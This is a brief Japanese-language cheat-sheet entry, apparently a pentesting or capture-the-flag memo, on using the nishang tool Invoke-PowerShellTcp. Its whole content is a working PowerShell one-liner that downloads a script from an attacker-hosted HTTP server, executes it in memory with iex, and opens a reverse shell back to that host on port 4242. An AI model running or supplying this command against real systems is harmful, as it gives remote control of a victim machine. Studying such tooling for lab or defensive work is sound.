# Invoke-PowerShellTcp(nishang)

# Usage
pythonSimpleHTTPServerをホストで立ててDL&Reverse shell貼るパターン
`powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.66.152:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.66.152 -Port 4242`
